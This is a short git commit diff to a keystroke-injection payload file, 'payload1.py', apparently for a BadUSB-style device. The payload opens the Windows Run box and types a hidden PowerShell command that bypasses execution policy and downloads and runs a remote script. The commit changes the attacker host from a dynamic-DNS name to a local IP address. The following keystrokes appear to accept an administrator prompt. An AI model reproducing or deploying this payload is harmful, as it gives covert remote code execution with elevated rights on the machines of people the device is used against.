3e4dbf6138ad3f0b1156a030935c29b903d4621c
a1pro2003 <66559945+a1pro2003@users.noreply.github.com>
2021-07-22 00:11:14 +0100

    Update payload1.py

--- keystroke_inj/payloads/payload1.py
+++ keystroke_inj/payloads/payload1.py
@@ -1,5 +1,5 @@
 data = """\RUNBOX
-powershell.exe -executionpolicy bypass -w hidden "iex(New-Object System.Net.WebClient).DownloadString('http://kali.servegame.com:8000/payload1.ps1'); payload1.ps1"
+powershell.exe -executionpolicy bypass -w hidden "iex(New-Object System.Net.WebClient).DownloadString('http://192.168.1.10:8000/payload1.ps1'); payload1.ps1"
 \ADMINPRESS
 \SLEEP 0.5
 \LEFTARROW
